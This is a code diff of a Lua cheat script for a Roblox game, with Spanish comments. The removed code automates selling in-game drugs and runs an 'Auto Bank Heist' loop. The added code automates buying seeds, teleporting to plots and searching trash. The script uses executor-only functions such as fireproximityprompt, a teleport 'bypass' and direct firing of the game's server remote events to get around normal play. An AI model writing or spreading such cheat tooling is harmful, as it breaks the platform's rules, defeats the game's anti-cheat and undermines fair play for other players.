+            Vector3.new(1409.71, 141.15, 38.04), Vector3.new(1415.64, 141.15, 38.04), Vector3.new(1421.45, 141.15, 38.04),
+            Vector3.new(1397.52, 141.15, 38.04)
+        }
 
-        local function getCourierSize()
-            local pd = RS:FindFirstChild("PlayerData")
-            local pData = pd and pd:FindFirstChild(LPLR.Name)
-            local stats = pData and pData:FindFirstChild("Statistics")
-            local sizeVal = stats and stats:FindFirstChild("CourierSize")
-            return sizeVal and sizeVal.Value or 0
-        end
+        local PLANT_CFG = { SEED = "None", AMOUNT = 1, GROUP = 1 }
 
-        local function isLucaUnlocked()
-            local pd = RS:FindFirstChild("PlayerData")
-            local pData = pd and pd:FindFirstChild(LPLR.Name)
-            local stats = pData and pData:FindFirstChild("Statistics")
-            local lore = stats and stats:FindFirstChild("LoreCharacters")
-            local luca = lore and lore:FindFirstChild("Luca")
-            local unlocked = luca and luca:FindFirstChild("Unlocked")
-            return unlocked and unlocked.Value or false
-        end
 
-        local function getOwnCourier()
-            local vf = WS:FindFirstChild("Vehicles")
-            if not vf then return nil end
-            for _, car in pairs(vf:GetChildren()) do
-                if car:IsA("Model") and car:GetAttribute("Car_Owner") == LPLR.Name then
-                    return car
-                end
-            end
-            return nil
-        end
+        local D_SEEDS = ADD_DRP(C1, "Available Seeds", function(v)
+            PLANT_CFG.SEED = SEEDS[v] or "None"
+        end)
+        local seedLabels = {}
+        for k, _ in pairs(SEEDS) do table.insert(seedLabels, k) end
+        D_SEEDS.REFRESH(seedLabels)
 
-        local function ensureCourierOut()
-            local car = getOwnCourier()
-            if not car then
-                local vObj = getVehicleObject()
-                if vObj then
-                    NOTIFY("Lucas Farm", "Spawning vehicle... wait 4s", 4)
-                    local RF = RS:FindFirstChild("RemoteFunctions")
-                    local spawnEvent = RF and RF:FindFirstChild("VehicleSpawn")
-                    if spawnEvent then
-                        spawnEvent:InvokeServer(vObj)
-                        task.wait(4)
-                        car = getOwnCourier()
-                    end
-                end
-            end
-            return car
-        end
+        local D_AMOUNT = ADD_DRP(C1, "Plant Amount: 1", function(v)
+            PLANT_CFG.AMOUNT = tonumber(v) or 1
+        end)
+        D_AMOUNT.REFRESH({ "1", "2", "3", "4", "5", "6", "7", "8", "9" })
 
-        local C_LUCAS = MK_CARD(FL, "Lucas Farm", "rbxassetid://80611041403886")
-
-        ADD_BTN(C_LUCAS, "Pack Items", function()
-            if not isLucaUnlocked() then
-                NOTIFY("Blocked", "You must unlock Luca first.", 5)
-                return
-            end
-
-            local vObj = getVehicleObject()
-            if not vObj then
-                NOTIFY("Error", "You don't have the required GMC Savana!", 5)
-                return
-            end
-
-            local hasItems = false
-            for _, item in pairs(LPLR.Backpack:GetChildren()) do
-                for _, name in pairs(DRUG_NAMES) do
-                    if item.Name == name then
-                        hasItems = true; break
-                    end
-                end
-                if hasItems then break end
-            end
-
-            if not hasItems then
-                NOTIFY("Error", "No products in inventory.", 4)
-                return
-            end
-
-            local car = ensureCourierOut()
-            if not car then
-                NOTIFY("Error", "Could not find or spawn the vehicle.", 5)
-                return
-            end
-
-            if getCourierSize() >= MAX_PRODUCT_LIMIT then
-                NOTIFY("Full", "The vehicle is already full (20/20).", 5)
-                return
-            end
-
-            local courierNode = car:FindFirstChild("Functional") and car.Functional:FindFirstChild("Mass") and
-                car.Functional.Mass:FindFirstChild("Courier")
-            local prompt = courierNode and courierNode:FindFirstChildOfClass("ProximityPrompt")
-
-            if not prompt then
-                NOTIFY("Error", "Loading point (Courier) not found.", 5)
-                return
-            end
-
-            local count = 0
-            local currentSize = getCourierSize()
-
-            for _, item in pairs(LPLR.Backpack:GetChildren()) do
-                if currentSize >= MAX_PRODUCT_LIMIT then break end
-                local isDrug = false
-                for _, name in pairs(DRUG_NAMES) do
-                    if item.Name == name then
-                        isDrug = true; break
-                    end
-                end
-
-                if isDrug then
-                    local promptPos = prompt.Parent.WorldCFrame
-                    LPLR.Character.HumanoidRootPart.CFrame = promptPos * CFrame.new(0, 1.5, 0)
-                    task.wait(0.15)
-                    LPLR.Character.Humanoid:EquipTool(item)
-                    task.wait(0.25)
-                    fireproximityprompt(prompt)
-                    task.wait(0.1)
-                    count = count + 1
-                    currentSize = currentSize + 1
-                end
-            end
-            NOTIFY("Lucas Farm", "Stored: " .. count .. " | Cargo: " .. currentSize .. "/20", 3)
+        ADD_BTN(C1, "TP to Plot", function()
+            local randIdx = math.random(1, 18)
+            BYPASS_TP(PLOT_VECTORS[randIdx])
+            NOTIFY("Plant Farm", "Teleported to Plot #" .. randIdx, 2)
         end)
 
-        ADD_BTN(C_LUCAS, "Sell", function()
-            if not isLucaUnlocked() then
-                NOTIFY("Blocked", "You must unlock Luca first.", 5)
+        ADD_BTN(C1, "Buy Selected Seed", function()
+            if PLANT_CFG.SEED == "None" then
+                NOTIFY("Plant Farm", "Select a seed first!", 3)
                 return
             end
-
-            if getCourierSize() <= 0 then
-                NOTIFY("Error", "The vehicle is empty!", 5)
-                return
+            NOTIFY("Plant Farm", "Buying " .. PLANT_CFG.AMOUNT .. " " .. PLANT_CFG.SEED .. "...", 3)
+            for i = 1, PLANT_CFG.AMOUNT do
+                game:GetService("ReplicatedStorage").Remotes.PurchaseSeed:FireServer(PLANT_CFG.SEED)
+                task.wait(0.1)
             end
-
-            local packSelling = WS:FindFirstChild("PackSelling")
-            local locales = { "the warehouses", "Linden courts", "Spring Creek", "fresh seafood", "the bridge",
-                "the central courts", "the deli alley", "the playground", "the railway drop" }
-            local luca = nil
-            for _, folder_name in pairs(locales) do
-                local folder = packSelling and packSelling:FindFirstChild(folder_name)
-                if folder and folder:FindFirstChild("Luca") then
-                    luca = folder.Luca; break
-                end
-            end
-
-            if not luca then
-                NOTIFY("Error", "Luca not found in any location!", 5)
-                return
-            end
-
-            local hrp_node = luca:FindFirstChild("HumanoidRootPart") and luca.HumanoidRootPart:FindFirstChild("Node")
-            local prompt = hrp_node and hrp_node:FindFirstChildOfClass("ProximityPrompt")
-            if not prompt or not prompt.Enabled then
-                NOTIFY("Cooldown", "Luca is busy or on Cooldown.", 5)
-                return
-            end
-
-            local car = ensureCourierOut()
-            if not car then
-                NOTIFY("Error", "Could not find or spawn the vehicle.", 5)
-                return
-            end
-
-            car:PivotTo(luca:GetPivot() * CFrame.new(0, 0, 8))
-            task.wait(0.5)
-
-            local RS_RE = RS:FindFirstChild("RemoteEvents")
-            local event = RS_RE and RS_RE:FindFirstChild("PackSell")
-            if event then
-                event:FireServer("Luca")
-                NOTIFY("Luca Sell", "Sale successful.", 3)
-            end
-        end)
-
-        -- ── AUTO SELL CARD ──────────────────────────────────────────
-        local C_AUTOSELL = MK_CARD(FL, "Auto Sell", "rbxassetid://99896558829728")
-        C_AUTOSELL.LayoutOrder = 99 -- Para asegurar que quede debajo de Lucas Farm
-
-        local AS_ENABLED = false
-        local AS_TARGET = ""
-        local AS_SELECTED_ITEM = ""
-
-        local AS_TGL = ADD_TGL(C_AUTOSELL, "Enable Auto Sell", false, function(val)
-            if val then
-                if AS_TARGET == "" then
-                    NOTIFY("Auto Sell", "Please select a Target (Dan/Pookie) first!", 4)
-                    _G.EXE.AS_TGL_OBJ:SET(false)
-                    return
-                end
-                if AS_SELECTED_ITEM == "" or AS_SELECTED_ITEM == "Waiting for items..." or AS_SELECTED_ITEM == "Empty Inventory" then
-                    NOTIFY("Auto Sell", "Please select an item to sell first!", 4)
-                    _G.EXE.AS_TGL_OBJ:SET(false)
-                    return
-                end
-            end
-            AS_ENABLED = val
-        end)
-        _G.EXE.AS_TGL_OBJ = AS_TGL
-
-        local AS_DRP = ADD_DRP(C_AUTOSELL, "Select Target", function(val)
-            AS_TARGET = val
-        end)
-        AS_DRP:ADD("Pookie", "Pookie")
-        AS_DRP:ADD("Dan", "Dan")
-        AS_DRP:ADD("Random", "Random")
-        local AS_DRP2 = ADD_DRP(C_AUTOSELL, "Inventory To Sell", function(val)
-            AS_SELECTED_ITEM = string.match(val, "^(.-)%s+x%d+$") or val
-        end)
-        AS_DRP2.REFRESH({ "Waiting for items..." })
-
-        task.spawn(function()
-            local validItems = {
-                ["Blueberry Syrup"] = true,
-                ["Blueberry Pack"] = true,
-                ["Blueberry Candy"] = true,
-                ["Blackberry Syrup"] = true,
-                ["Blackberry Pack"] = true,
-                ["Blackberry Candy"] = true,
-                ["Goldberry Candy"] = true,
-                ["Goldberry Pack"] = true,
-                ["Goldberry Syrup"] = true,
-                ["Green Fun Flour Pack"] = true,
-                ["Purple Fun Flour Pack"] = true,
-                ["Raspberry Candy"] = true,
-                ["Raspberry Pack"] = true,
-                ["Raspberry Syrup"] = true,
-                ["Red Fun Flour Pack"] = true,
-                ["White Fun Flour Pack"] = true
-            }
-            local lastListStr = ""
-            local hasNotifiedMonitoring = false
-
-            while task.wait(0.5) do
-                -- Si se apaga, resetear las notificaciones para la próxima vez
-                if not AS_ENABLED then
-                    hasNotifiedMonitoring = false
-                end
-
-                local char = LPLR.Character
-                local backpack = LPLR:FindFirstChild("Backpack")
-
-                if backpack then
-                    local counts = {}
-                    -- Contar en mochila
-                    for _, tool in pairs(backpack:GetChildren()) do
-                        if validItems[tool.Name] then
-                            counts[tool.Name] = (counts[tool.Name] or 0) + 1
-                        end
-                    end
-                    -- Contar en la mano del personaje
-                    if char then
-                        local tool = char:FindFirstChildOfClass("Tool")
-                        if tool and validItems[tool.Name] then
-                            counts[tool.Name] = (counts[tool.Name] or 0) + 1
-                        end
-                    end
-
-                    local drpList = {}
-                    for name, count in pairs(counts) do
-                        table.insert(drpList, name .. " x" .. tostring(count))
-                    end
-
-                    table.sort(drpList) -- Ordena alfabéticamente
-                    if #drpList == 0 then
-                        table.insert(drpList, "Empty Inventory")
-                    else
-                        table.insert(drpList, 1, "Sell All")
-                    end
-
-                    local curListStr = table.concat(drpList, "|")
-                    if curListStr ~= lastListStr then
-                        lastListStr = curListStr
-                        AS_DRP2.REFRESH(drpList)
-                        if AS_SELECTED_ITEM == "Sell All" then
-                            if #drpList == 1 and drpList[1] == "Empty Inventory" then
-                                AS_SELECTED_ITEM = ""
-                                if AS_ENABLED then
-                                    NOTIFY("Auto Sell", "Finished selling all items!", 5)
-                                end
-                            end
-                        elseif AS_SELECTED_ITEM ~= "" and AS_SELECTED_ITEM ~= "Empty Inventory" and AS_SELECTED_ITEM ~= "Waiting for items..." and not counts[AS_SELECTED_ITEM] then
-                            local oldItem = AS_SELECTED_ITEM
-                            AS_SELECTED_ITEM = "" -- Reset si el objeto específico se agota
-                            if AS_ENABLED then
-                                NOTIFY("Auto Sell", "Finished selling all " .. oldItem .. "!", 5)
-                            end
-                        end
-                    end
-
-                    -- AUTO SELL LÓGICA CORE
-                    if AS_ENABLED and AS_SELECTED_ITEM ~= "" and AS_SELECTED_ITEM ~= "Empty Inventory" and AS_SELECTED_ITEM ~= "Waiting for items..." then
-                        local pookiePrompt = findPromptFor("Pookie")
-                        local danPrompt = findPromptFor("Dan")
-
-                        local pActive = pookiePrompt and pookiePrompt.Enabled
-                        local dActive = danPrompt and danPrompt.Enabled
-
-                        -- Si ninguno está activo, solo esperamos (no equipamos nada)
-                        if not pActive and not dActive then
-                            if not hasNotifiedMonitoring then
-                                NOTIFY("Auto Sell", "Monitoring for buyers...", 3)
-                                hasNotifiedMonitoring = true
-                            end
-                        else
-                            local targetStr = nil
-                            if AS_TARGET == "Random" then
-                                local choices = {}
-                                if pActive then table.insert(choices, "Pookie") end
-                                if dActive then table.insert(choices, "Dan") end
-                                if #choices > 0 then
-                                    targetStr = choices[math.random(1, #choices)]
-                                end
-                            elseif AS_TARGET == "Pookie" and pActive then
-                                targetStr = "Pookie"
-                            elseif AS_TARGET == "Dan" and dActive then
-                                targetStr = "Dan"
-                            end
-
-                            -- Si definimos a quién venderle, entonces equipamos el arma y la vendemos
-                            if targetStr then
-                                local actualItemToSell = AS_SELECTED_ITEM
-                                if actualItemToSell == "Sell All" then
-                                    local availableKeys = {}
-                                    for k, _ in pairs(counts) do table.insert(availableKeys, k) end
-                                    if #availableKeys > 0 then
-                                        actualItemToSell = availableKeys[math.random(1, #availableKeys)]
-                                    else
-                                        actualItemToSell = nil
-                                    end
-                                end
-
-                                if actualItemToSell then
-                                    local toolToSell = char and char:FindFirstChild(actualItemToSell)
-
-                                    if not toolToSell then
-                                        toolToSell = backpack:FindFirstChild(actualItemToSell)
-                                        if toolToSell and char then
-                                            local human = char:FindFirstChildOfClass("Humanoid")
-                                            if human then
-                                                human:EquipTool(toolToSell)
-                                                task.wait(0.3) -- Esperar a que se equipe
-                                            end
-                                        end
-                                    end
-
-                                    if toolToSell and toolToSell.Parent == char then
-                                        local Event = game:GetService("ReplicatedStorage"):FindFirstChild("RemoteEvents") and
-                                            game:GetService("ReplicatedStorage").RemoteEvents:FindFirstChild("PackSell")
-                                        if Event then
-                                            Event:FireServer(targetStr)
-                                            NOTIFY("Auto Sell", "Sold 1x " .. actualItemToSell .. " to " .. targetStr, 1)
-                                            hasNotifiedMonitoring = false -- Resetear la notificación tras una venta
-                                            task.wait(1.5)                -- Cooldown para permitir reset del prompt
-                                        end
-                                    end
-                                end
-                            end
-                        end
-                    end
-                end
-            end
-        end)
-
-        local C_BANK = MK_CARD(FR, "Bank farm", "rbxassetid://139426182681638")
-
-        local BankFarmEnabled = false
-        local HeistWaitUntil = 0
-        local LPLR = game:GetService("Players").LocalPlayer
-
-        local function IS_EQUIPPED(name)
-            local char = LPLR.Character or LPLR.CharacterAdded:Wait()
-            if name == "Mask" then
-                return char:FindFirstChild("MaskAcc") ~= nil
-            elseif name == "Gloves" then
-                local r = char:FindFirstChild("RightHand")
-                local l = char:FindFirstChild("LeftHand")
-                return (r and r:FindFirstChild("GloveAppearance") ~= nil) and
-                    (l and l:FindFirstChild("GloveAppearance") ~= nil)
-            end
-            return false
-        end
-
-        local function HAS_IN_BAG(name) return LPLR.Backpack:FindFirstChild(name) ~= nil end
-
-        local function BUY_AND_EQUIP_MASK()
-            local StorePurchase = game:GetService("ReplicatedStorage").RemoteFunctions.StorePurchase
-            local UncleChester = game:GetService("ReplicatedStorage").StoreMenus["Uncle Chester"]["Bank Heist"]
-            if not IS_EQUIPPED("Mask") then
-                if not HAS_IN_BAG("Mask") then
-                    NOTIFY("STORE", "Buying Mask...", 2); StorePurchase:InvokeServer(UncleChester.Mask); task.wait(0.5)
-                end
-                if HAS_IN_BAG("Mask") then
-                    LPLR.Character.Humanoid:EquipTool(LPLR.Backpack.Mask); task.wait(0.3)
-                end
-                game:GetService("ReplicatedStorage").RemoteEvents.ToggleMask:FireServer()
-            end
-        end
-
-        local function BUY_AND_EQUIP_GLOVES()
-            local StorePurchase = game:GetService("ReplicatedStorage").RemoteFunctions.StorePurchase
-            local UncleChester = game:GetService("ReplicatedStorage").StoreMenus["Uncle Chester"]["Bank Heist"]
-            if not IS_EQUIPPED("Gloves") then
-                if not HAS_IN_BAG("Gloves") then
-                    NOTIFY("STORE", "Buying Gloves...", 2); StorePurchase:InvokeServer(UncleChester.Gloves); task.wait(0.5)
-                end
-                if HAS_IN_BAG("Gloves") then
-                    LPLR.Character.Humanoid:EquipTool(LPLR.Backpack.Gloves); task.wait(0.3)
-                end
-                game:GetService("ReplicatedStorage").RemoteEvents.ToggleGloves:FireServer()
-            end
-        end
-
-        local currentBankLoopId = 0
-        if _G.BankItemsBought == nil then _G.BankItemsBought = false end
-
-        local function get_cd_time()
-            local cd = workspace.BankHeist.C4:FindFirstChild("CooldownTag", true)
-            local tObj = cd and cd:FindFirstChild("Time", true)
-            if tObj then
-                if tObj:IsA("IntValue") or tObj:IsA("NumberValue") then
-                    return tObj.Value
-                elseif tObj:IsA("TextLabel") or tObj:IsA("TextBox") then
-                    return tonumber(tObj.Text:match("%d+")) or 0
-                end
-            end
-            return 0
-        end
-
-        local function IS_VAULT_OPEN()
-            local t = workspace.BankHeist.Tables:GetChildren()[2]
-            local interact = t and t:FindFirstChild("Interact")
-            local prompt = interact and interact:FindFirstChildOfClass("ProximityPrompt")
-            return prompt and prompt.Enabled or false
-        end
-
-        -- [[ UTILIDADES DE EQUIPO (MÁSCARA Y GUANTES) ]]
-        local function IS_EQUIPPED_MASK()
-            if not LPLR.Character then return false end
-            for _, obj in ipairs(LPLR.Character:GetChildren()) do
-                if obj:IsA("Accessory") and (obj.Name == "MaskAcc" or obj.Name:lower():find("mask")) then
-                    return true
-                end
-            end
-            return false
-        end
-
-        local function IS_EQUIPPED_GLOVES()
-            if not LPLR.Character then return false end
-            for _, obj in ipairs(LPLR.Character:GetDescendants()) do
-                local name = obj.Name:lower()
-                if name:find("glove") or name:find("guante") or name == "GlovesAcc" or (obj:IsA("MeshPart") and name:find("hand") and obj.Parent.Name:lower():find("glove")) then
-                    return true
-                end
-            end
-            local rh = LPLR.Character:FindFirstChild("RightHand") or LPLR.Character:FindFirstChild("Right Arm")
-            if rh and rh:IsA("BasePart") then
-                local c = rh.Color
-                if c.r < 0.15 and c.g < 0.15 and c.b < 0.15 then return true end
-            end
-            return false
-        end
-
-        local function PREPARE_MASK()
-            if IS_EQUIPPED_MASK() then return true end
-            if LPLR.Backpack:FindFirstChild("Mask") == nil then
-                local StorePurchase = game:GetService("ReplicatedStorage").RemoteFunctions.StorePurchase
-                local MaskItem = game:GetService("ReplicatedStorage").StoreMenus["Uncle Chester"]["Bank Heist"].Mask
-                StorePurchase:InvokeServer(MaskItem); task.wait(1.5)
-            end
-            local tool = LPLR.Backpack:FindFirstChild("Mask")
-            if tool then
-                LPLR.Character.Humanoid:EquipTool(tool); task.wait(0.5)
-                game:GetService("ReplicatedStorage").RemoteEvents.ToggleMask:FireServer(); task.wait(0.5)
-            end
-            return IS_EQUIPPED_MASK()
-        end
-
-        local LAST_GLOVE_TOGGLE = 0
-        local function PREPARE_GLOVES()
-            if IS_EQUIPPED_GLOVES() then return true end
-            if tick() - LAST_GLOVE_TOGGLE < 5 then return false end
-            if LPLR.Backpack:FindFirstChild("Gloves") == nil then
-                local StorePurchase = game:GetService("ReplicatedStorage").RemoteFunctions.StorePurchase
-                local GlovesItem = game:GetService("ReplicatedStorage").StoreMenus["Uncle Chester"]["Bank Heist"].Gloves
-                StorePurchase:InvokeServer(GlovesItem); task.wait(1.5)
-            end
-            local tool = LPLR.Backpack:FindFirstChild("Gloves")
-            if tool then
-                LPLR.Character.Humanoid:EquipTool(tool); task.wait(0.5)
-                game:GetService("ReplicatedStorage").RemoteEvents.ToggleGloves:FireServer()
-                LAST_GLOVE_TOGGLE = tick(); task.wait(0.5)
-            end
-            return IS_EQUIPPED_GLOVES()
-        end
-
-        local function CHECK_GEAR_BANK()
-            if not IS_EQUIPPED_MASK() then
-                if not PREPARE_MASK() then return false end
-            end
-            if not IS_EQUIPPED_GLOVES() then
-                if not PREPARE_GLOVES() then return false end
-            end
-            return IS_EQUIPPED_MASK() and IS_EQUIPPED_GLOVES()
-        end
-
-        -- MONITOR GLOBAL DE COOLDOWN DE VENTA (Funciona sin importar el toggle)
-        task.spawn(function()
-            local notified = false
-            while true do
-                if _G.SellCooldownEnd and _G.SellCooldownEnd > tick() then
-                    notified = true
-                elseif notified and _G.SellCooldownEnd and _G.SellCooldownEnd <= tick() then
-                    notified = false
-                    NOTIFY("Sell Cooldown", "You can sell now!", 5)
-                end
-                task.wait(1)
-            end
-        end)
-
-        local function HAS_GOLD()
-            return workspace:FindFirstChild(LPLR.Name) and workspace[LPLR.Name]:FindFirstChild("DuffelGold") ~= nil
-        end
-
-        local function DO_BANK_LOOP(myLoopId)
-            local roundCount = 0
-            while BankFarmEnabled and _G.CURRENT_BANK_LOOP_ID == myLoopId and roundCount < 2 do
-                local cd = get_cd_time()
-                if cd > 1 then
-                    NOTIFY("Bank", "Cooldown: " .. math.floor(cd), 3)
-                    task.wait(5)
-                elseif _G.SellCooldownEnd and _G.SellCooldownEnd > tick() then
-                    -- Esperar si el vendedor de oro está en cooldown
-                    local remains = math.floor(_G.SellCooldownEnd - tick())
-                    NOTIFY("Sell Cooldown", "Wait to start Round: " .. remains .. "s", 1)
-                    task.wait(1)
-                else
-                    -- COMPRA DE SUMINISTROS (Sólo en Ronda 1 si el banco está activo)
-                    if roundCount == 0 then
-                        local StorePurchase = game:GetService("ReplicatedStorage").RemoteFunctions.StorePurchase
-                        local UncleChester = game:GetService("ReplicatedStorage").StoreMenus["Uncle Chester"]
-                            ["Bank Heist"]
-                        if LPLR.Backpack:FindFirstChild("Duffel Bag") == nil then
-                            StorePurchase:InvokeServer(UncleChester["Duffel Bag"]); task.wait(0.3)
-                        end
-                        if LPLR.Backpack:FindFirstChild("Explosive Charge") == nil then
-                            StorePurchase:InvokeServer(UncleChester["Explosive Charge"]); task.wait(0.3)
-                        end
-                    end
-
-                    if CHECK_GEAR_BANK() then
-                        roundCount = roundCount + 1
-
-                        -- ROUND 1: PLANTAR
-                        if roundCount == 1 then
-                            LPLR.Character.HumanoidRootPart.CFrame = workspace.BankHeist.C4:GetPivot()
-                            task.wait(0.3)
-                            local c4_tool = LPLR.Backpack:FindFirstChild("Explosive Charge")
-                            if c4_tool then
-                                LPLR.Character.Humanoid:EquipTool(c4_tool); task.wait(0.2)
-                            end
-
-                            FORCE_HOLD(workspace.BankHeist.C4.Attachment.ProximityPrompt)
-                            -- TP INMEDIATO TRAS PLANTAR
-                            LPLR.Character.HumanoidRootPart.CFrame = workspace.BankHeist.Tables:GetChildren()[2]
-                                .Interact:GetPivot() * CFrame.new(0, 0, 3)
-                            task.wait(6.30)
-                        else
-                            -- ROUND 2: TP DIRECTO
-                            LPLR.Character.HumanoidRootPart.CFrame = workspace.BankHeist.Tables:GetChildren()[2]
-                                .Interact:GetPivot() * CFrame.new(0, 0, 3)
-                            task.wait(1)
-                        end
-
-                        -- SELECCION DE MESA
-                        local tableA = workspace.BankHeist.Tables:GetChildren()[2]
-                        local tableB = workspace.BankHeist.Tables.Table
-
-                        local function is_valid(t)
-                            if not t then return false end
-                            local p = t.Interact:FindFirstChildOfClass("ProximityPrompt")
-                            return p ~= nil -- Solo verificamos que exista, el spam se encargará del resto
-                        end
-
-                        local function get_gold(t)
-                            local rem = nil
-                            if t.Name == "Table" then
-                                rem = t.GoldBottom.Remaining
-                            else
-                                rem = t.GoldTop.Remaining
-                            end
-                            if rem:IsA("IntValue") or rem:IsA("NumberValue") then
-                                return rem.Value
-                            end
-                            return tonumber(rem.Text:match("%d+")) or 0
-                        end
-
-                        local targetTable = nil
-                        if is_valid(tableA) and get_gold(tableA) >= 10 then
-                            targetTable = tableA
-                        elseif is_valid(tableB) and get_gold(tableB) >= 10 then
-                            targetTable = tableB
-                        elseif is_valid(tableA) then
-                            targetTable = tableA
-                        elseif is_valid(tableB) then
-                            targetTable = tableB
-                        end
-
-                        if targetTable then
-                            LPLR.Character.HumanoidRootPart.CFrame = targetTable.Interact:GetPivot()
-                            task.wait(0.2)
-                            local prompt = targetTable.Interact:FindFirstChildOfClass("ProximityPrompt")
-                            if prompt then
-                                for _ = 1, 11 do
-                                    task.spawn(function()
-                                        pcall(function()
-                                            fireproximityprompt(prompt)
-                                        end)
-                                    end)
-                                end
-                                task.wait(0.5)
-                            end
-                        end
-
-                        -- VENDER (Solo si tiene oro)
-                        if HAS_GOLD() then
-                            local sellNode = workspace.Jewellery.Jewellery.Node
-
-                            -- ESPERA SI HAY COOLDOWN DE VENTA (Detectado por Hook)
-                            while _G.SellCooldownEnd and _G.SellCooldownEnd > tick() and BankFarmEnabled do
-                                local remains = math.floor(_G.SellCooldownEnd - tick())
-                                NOTIFY("Sell Cooldown", "Wait: " .. remains .. "s", 1)
-                                task.wait(1)
-                            end
-
-                            LPLR.Character.HumanoidRootPart.CFrame = sellNode:GetPivot()
-                            task.wait(0.5)
-                            fireproximityprompt(sellNode.SellPrompt)
-                            task.wait(0.5) -- Espera breve para capturar notificaciones
-
-                            -- SI TRAS EL INTENTO DE VENTA SE ACTIVA EL COOLDOWN, ESPERAR AQUÍ
-                            if _G.SellCooldownEnd and _G.SellCooldownEnd > tick() then
-                                while _G.SellCooldownEnd > tick() and BankFarmEnabled do
-                                    local remains = math.floor(_G.SellCooldownEnd - tick())
-                                    NOTIFY("Sell Cooldown", "Wait (Failed): " .. remains .. "s", 1)
-                                    task.wait(1)
-                                end
-                                -- Reintento de venta tras esperar
-                                if HAS_GOLD() then
-                                    fireproximityprompt(sellNode.SellPrompt)
-                                    task.wait(1)
-                                end
-                            end
-                        end
-                    end
-                end
-                task.wait(0.5)
-            end
-            BankFarmEnabled = false
-            NOTIFY("Bank", "Farm Finished (2 Rounds)", 5)
-        end
-
-
-        local function HOOK_NOTIFS()
-            local Event = game:GetService("ReplicatedStorage"):WaitForChild("RemoteEvents"):WaitForChild("Notification")
-            if not _G.BANK_NOTIF_HOOK_ID then _G.BANK_NOTIF_HOOK_ID = 0 end
-            local my_id = _G.BANK_NOTIF_HOOK_ID + 1
-            _G.BANK_NOTIF_HOOK_ID = my_id
-
-            Event.OnClientEvent:Connect(function(...)
-                if _G.BANK_NOTIF_HOOK_ID ~= my_id then return end
-                local args = { ... }
-                local msg = tostring(args[2] or ""):lower()
-
-                if msg:find("buy gold bars") then
-                    local s = tonumber(msg:match("%d+"))
-                    if s then _G.SellCooldownEnd = tick() + s + 1 end
-                elseif msg:find("seconds") then
-                    -- Cooldown del banco
-                    local s = tonumber(msg:match("%d+"))
-                    if s then HeistWaitUntil = tick() + s + 2 end
-                end
-            end)
-        end
-
-        ADD_TGL(C_BANK, "Auto Bank Heist", false, function(v)
-            BankFarmEnabled = v
-            if v then
-                _G.CURRENT_BANK_LOOP_ID = (_G.CURRENT_BANK_LOOP_ID or 0) + 1
-                HeistWaitUntil = 0
-                CHECK_GEAR_BANK() -- MONITOREO DE EQUIPO
-                NOTIFY("Bank", "System Enabled!", 2)
-                task.spawn(HOOK_NOTIFS)
-                task.spawn(function() DO_BANK_LOOP(_G.CURRENT_BANK_LOOP_ID) end)
-            else
-                NOTIFY("Bank", "System Disabled", 2)
-            end
-        end)
-
-        ADD_BTN(C_BANK, "Buy & Equip Mask", function()
-            task.spawn(BUY_AND_EQUIP_MASK)
-        end)
-
-        ADD_BTN(C_BANK, "Buy & Equip Gloves", function()
-            task.spawn(BUY_AND_EQUIP_GLOVES)
         end)
 
         -- ── EXTRAS CARD ────────────────────────────────────────────────────────────
-        local C_EXTRAS = MK_CARD(FR, "Extras", "rbxassetid://106507089706013")
-        local DumpFarmEnabled = false
-        local BoxFarmEnabled = false
-        local TrapRobEnabled = false
+        local C_EXTRAS = MK_CARD(FL, "Extras", "rbxassetid://106507089706013")
+        local TRASH_R = false
+        local function DO_TRASH()
+            local f = workspace:FindFirstChild("Folder", true) and workspace.Folder:FindFirstChild("map", true)
+                and workspace.Folder.map:FindFirstChild("TrashBags", true)
 
-        -- [[ LOGICA DUMP FARMS (SINCRO EXACTA) ]]
-        local ATM_COOLDOWNS = {}             -- [Object] = LastUsedTime
-        local GLOBAL_COOLDOWN_UNTIL = 0
-        local FRAUD_COOLDOWN_TIMEValue = 240 -- 4 minutes (per user request)
-        local LAST_ATM_USED = nil
-        local LAST_ERROR_RECEIVED = nil
-
-        local function TELEPORT(targetPos)
-            if LPLR.Character and LPLR.Character:FindFirstChild("HumanoidRootPart") then
-                LPLR.Character.HumanoidRootPart.CFrame = CFrame.new(targetPos + Vector3.new(0, 3, 0))
-                task.wait(0.15)
+            if not f then
+                -- Fallback: Search globally for TrashBags if path is broken
+                f = workspace:FindFirstChild("TrashBags", true)
             end
-        end
 
-        local function BURST_INTERACT(prompt)
-            if not prompt then return end
-            for _ = 1, 5 do
-                task.spawn(function() pcall(function() fireproximityprompt(prompt) end) end)
-            end
-        end
+            if not f then return end
 
-        local function HAS_ITEM(name)
-            return LPLR.Backpack:FindFirstChild(name) ~= nil or
-                (LPLR.Character and LPLR.Character:FindFirstChild(name) ~= nil)
-        end
-
-        local function GET_ANY_DUMP()
-            return LPLR.Backpack:FindFirstChild("Dump (High)") or LPLR.Backpack:FindFirstChild("Dump (Mid)") or
-                LPLR.Backpack:FindFirstChild("Dump (Low)") or
-                (LPLR.Character and (LPLR.Character:FindFirstChild("Dump (High)") or LPLR.Character:FindFirstChild("Dump (Mid)") or LPLR.Character:FindFirstChild("Dump (Low)")))
-        end
-
-        local function PARSE_TIME(text)
-            local m = text:match("(%d+)m")
-            local s = text:match("(%d+)s")
-            local total = 0
-            if m then total = total + (tonumber(m) * 60) end
-            if s then total = total + tonumber(s) end
-            if total == 0 then total = tonumber(text:match("%d+")) or 0 end
-            return total
-        end
-
-        local function DO_DUMP_LOOP()
-            local RS_STORE = game:GetService("ReplicatedStorage")
-            local StorePurchase = RS_STORE.RemoteFunctions.StorePurchase
-            local UncleMisc = RS_STORE.StoreMenus["Uncle Chester"].Misc
-            NOTIFY("Dump Farm", "Exact system synchronized.", 3)
-            while DumpFarmEnabled do
-                local hasDump = GET_ANY_DUMP()
-                if tick() < GLOBAL_COOLDOWN_UNTIL and not hasDump then
-                    local wait_secs = math.ceil(GLOBAL_COOLDOWN_UNTIL - tick())
-                    local mins = math.floor(wait_secs / 60)
-                    local secs = wait_secs % 60
-                    local time_str = string.format("%d:%02d", mins, secs)
-                    if tick() % 10 < 1 then
-                        NOTIFY("Dump Farm", "🕒 Cooldown: " .. time_str .. " to next run", 3)
+            local pL = {}
+            for _, v in ipairs(f:GetDescendants()) do
+                if v:IsA("ProximityPrompt") and v.Enabled then
+                    local act = v.ActionText:lower()
+                    local obj = v.ObjectText:lower()
+                    if act:find("search") or act:find("trash") or act:find("pile") or act:find("bag")
+                        or obj:find("trash") or obj:find("bag") then
+                        table.insert(pL, v)
                     end
-                    task.wait(1) -- More precise check for the countdown logic
+                end
+            end
+
+            for _, p in ipairs(pL) do
